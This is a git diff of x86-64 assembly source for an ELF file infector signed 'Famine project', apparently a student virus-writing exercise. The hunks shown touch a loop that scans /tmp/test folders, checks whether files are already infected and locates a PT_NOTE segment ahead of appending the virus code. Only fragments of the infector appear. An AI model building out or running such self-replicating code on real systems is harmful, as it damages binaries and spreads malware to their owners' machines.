@@ -8,12 +8,6 @@
 
 %define BARRA_N     10
 
-;debug
-section .data
-    hello db 'Hello, World!', BARRA_N, NULL
-    newline db  BARRA_N, NULL
-;debug
-
 section .text
     global _start
 
@@ -109,6 +103,10 @@ iterate_loop:
 
     ;check if it's already infected, if i'm appending to EOF the signature i can check there.
 
+    mov r8, [r15 + 176]
+    mov rbx, 0
+    mov r14, 0
+
     call find_phdr ; find PT_NOTE segment
     cmp rax, 2 ; check if it's a PT_NOTE segment
     jne .close_file ; if not, go to next entry
@@ -116,7 +114,6 @@ iterate_loop:
 
     call hello_world  ; print "Hello, World!"
 
-    ; iterate over sections to find PT_NOTE
 
     ; infect
         ; for infection i must append virus to the file, then i must
@@ -228,6 +225,9 @@ safe_exit:
 folder1 db "/tmp/test", NULL
 folder2 db "/tmp/test2", NULL
 
+hello db 'Hello, World!', BARRA_N, NULL
+newline db  BARRA_N, NULL
+
 signature db "Famine project coded by gemartin", NULL
 
 
@@ -237,7 +237,7 @@ restore_stack:
     pop rdx            ; restore rdx
     jmp _end           ; jump to _end to exit
 
-_end:
+exit_success:
     xor rdi, rdi
     mov rax, SYS_EXIT
     syscall
